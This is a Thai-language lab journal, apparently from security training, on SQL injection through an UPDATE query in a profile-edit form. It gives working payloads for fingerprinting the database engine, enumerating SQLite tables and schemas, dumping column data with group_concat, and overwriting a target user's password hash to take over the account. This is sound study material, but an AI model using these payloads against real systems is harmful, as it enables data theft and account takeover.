# Day 2 — SQL Injection Part 2

---

## สิ่งที่เรียนวันนี้

Day 2 ต่างจาก Day 1 ชัดเจน เนื่องจากมีความ Advance มากกว่า ไม่ได้ให้คำใบ้โดยตรง จำเป็นต้องลงมือทำเองเพื่อให้สามารถผ่าน Challenge ได้

ข้อแตกต่างที่สำคัญคือ ใน Day 1 จะเป็นการเข้าถึงข้อมูลโดยไม่ได้มีการแก้ไขข้อมูลบน Database แต่ใน Day 2 ต่างออกไป เนื่องจากมี Attack กับ Database โดยใช้คำสั่ง UPDATE ซึ่งสามารถแก้ไขข้อมูลในระบบ Database เพื่อให้สามารถเข้าถึงข้อมูลในระบบได้

หากใช้คำง่ายๆ คือการยกระดับความร้ายแรงจากช่องโหว่ — จาก **อ่านข้อมูล** เป็น **แก้ไขข้อมูล**

---

## SQL Injection Attack on an UPDATE คืออะไร

ช่องโหว่ที่พบอยู่ในลักษณะที่ระบบมีช่องโหว่ในส่วนของการแก้ไขข้อมูลส่วนตัวของผู้ใช้งาน อย่าง Nick Name, E-mail, Password แต่ไม่ได้มีการออกแบบที่รัดกุม (ไม่ได้มีระบบป้องกันการแทรกคำสั่ง SQL ที่จะมีผลต่อความปลอดภัยของระบบ)

หากมีการแทรก Payload คำสั่ง SQL ในช่อง Input ดังกล่าว ระบบจะดำเนินการ query ข้อมูลบน Database ทันที ส่งผลให้สามารถเข้าถึงข้อมูลอื่นๆ ในระบบได้ด้วย เช่น ชื่อผู้ใช้งานอื่น, Password เป็นต้น

**โครงสร้าง SQL เบื้องหลัง:**
```sql
UPDATE <table_name> SET nickName='input', email='input' WHERE <condition>
```

เมื่อ input ไม่ได้รับการ sanitize — ผู้โจมตีสามารถปิด string และแทรก column เพิ่มเข้าไปใน SET clause ได้โดยตรง

---

## Payload ที่ทดลองทำครั้งแรก (ก่อนผ่าน Challenge)

ในช่วงแรกติดปัญหาค่อนข้างนาน เนื่องจากต้องหาโครงสร้างของคำสั่ง SQL ที่สามารถ query ได้ จึงลองใช้เทคนิคหลายๆ แบบ ทั้ง Integer field และ String field เพื่อหารูปแบบโครงสร้างที่ถูกต้อง

นอกจากนี้ยังมีพลาดในขั้นตอนการแสดงผลลัพธ์ของข้อมูล กล่าวคือ:

- หาก schema แสดงผลด้วย backtick เช่น `` `column_name` `` จะสามารถระบุ column ได้ชัดเจนทันที
- แต่หาก schema ไม่มี backtick เช่น `id integer primary key, secret text not null` ต้องอ่าน output ให้ละเอียดก่อน ไม่เช่นนั้นจะ SELECT ข้อมูลไม่ครบและต้องทำซ้ำ

**บทเรียน:** อ่าน schema output ให้ครบก่อนเขียน payload dump เสมอ

---

## Challenge 1: UPDATE Statement

> ⚠️ ไม่เปิดเผยชื่อ Table จริงที่เกี่ยวข้องกับโจทย์ — ใช้ T1, T2 แทน

### Step 1 — ระบุชนิดของ Database Engine

ก่อน enumerate ต้องรู้ก่อนว่าใช้ DB engine อะไร เพราะแต่ละ engine ใช้ syntax และ system table ต่างกัน — query ที่ใช้กับ SQLite ใช้กับ MySQL ไม่ได้

```sql
-- MySQL / MSSQL
',nickName=@@version,email='

-- Oracle
',nickName=(SELECT banner FROM v$version),email='

-- SQLite
',nickName=sqlite_version(),email='
```

### Step 2 — Enumerate Tables

ใช้ `group_concat()` แสดงชื่อ table ทั้งหมดใน `sqlite_master` เพื่อให้ทราบภาพรวมของ Database

```sql
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
```

### Step 3 — ตรวจสอบโครงสร้างของแต่ละ Table

หลังรู้ชื่อ table แล้ว ดึง schema ออกมาเพื่อรู้ว่ามี column อะไรบ้าง

```sql
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='T1'),email='
```

> หาก table เป้าหมายยังไม่พบใน T1 ให้ทำ Step 3 และ 4 ซ้ำกับ table อื่นๆ จนกว่าจะพบเป้าหมาย — enumeration เป็น iterative process ไม่ใช่ทำครั้งเดียวจบ

### Step 4 — Dump ข้อมูลภายใน Table

ใช้ `group_concat()` + `||` operator เพื่อ concatenate หลาย column ออกมาเป็น string เดียว

```sql
',nickName=(SELECT group_concat(col1 || "," || col2 || "," || col3 || ":") from T1),email='
```

### Step 5 — ระบุ Hash Type และสร้าง Hash ใหม่

Password ในระบบถูกเก็บเป็น Hash ไม่ใช่ plaintext ดังนั้น:

1. ใช้ **hash-identifier** เพื่อระบุ format (เช่น SHA256 = 64 hex characters)
2. ใช้ **CyberChef** เพื่อ hash password ใหม่ที่ต้องการในรูปแบบเดิม

> ต้องรู้ hash type ก่อนเสมอ เพราะแต่ละ format มีวิธีสร้างต่างกัน — การใส่ hash ผิด format จะทำให้ login ไม่ได้

### Step 6 — อัปเดต Password

```sql
', password='<hash_ใหม่>' WHERE name='TargetUser'-- -
```

### Step 7 — Login และ Enumerate Table เป้าหมาย

Login ด้วย credential ใหม่ที่แก้ไขแล้ว จากนั้น dump ข้อมูลจาก table เป้าหมายด้วย payload เดียวกับ Step 4 โดยอ้างอิง column name จาก schema ที่ enumerate มา

---

## จุดที่เข้าใจผิดตอนแรก

### group_concat() — เข้าใจผิดในตอนแรก

**เข้าใจผิด:** คิดว่า `group_concat()` ทำหน้าที่แสดงข้อมูลของ User ที่ทำการ login อยู่ในระบบเท่านั้น

**ที่ถูกต้อง:** `group_concat()` คือการนำค่าหลายๆ ค่า (หลาย rows) มาเรียงต่อกัน เพื่อให้สามารถแสดงผลข้อมูลทั้งหมดออกมาเป็นผลลัพธ์เดียวในรูปแบบ string

**เหตุผลที่ต้องใช้:** nickName field รับได้แค่ 1 value แต่ SELECT อาจคืนมาหลาย rows — `group_concat()` แก้ปัญหานี้โดยรวมทุก row เป็น string เดียวก่อนส่งเข้า field

---

## คำถามที่ยังไม่ชัด

โจทย์นี้ยังไม่ยากมาก เพราะขนาดของข้อมูลภายใน Database มีน้อย ซึ่งจะแตกต่างจาก Database จริงที่มีข้อมูลจำนวนมาก

การที่ข้อมูลมากขึ้น นั่นอาจเป็นงานที่ยากขึ้นที่จะต้องหาเป้าหมายที่ต้องการ และการรู้คำสั่ง SQL หลายๆ แบบจะช่วยได้มากในการจัดการข้อมูลจำนวนมากๆ ได้

**Open question ที่กำลังศึกษาต่อ:** เมื่อ Database มีข้อมูลจำนวนมาก จะใช้ SQL command อะไร เช่น `LIMIT`, `WHERE`, หรือ `OFFSET` เพื่อ filter และ navigate ข้อมูลให้ตรงเป้าหมายได้เร็วขึ้น — จะศึกษาเพิ่มเติมใน Part ถัดไป

---

*Day 2 Complete — ต่อไป: Vulnerable Startup: Broken Authentication*
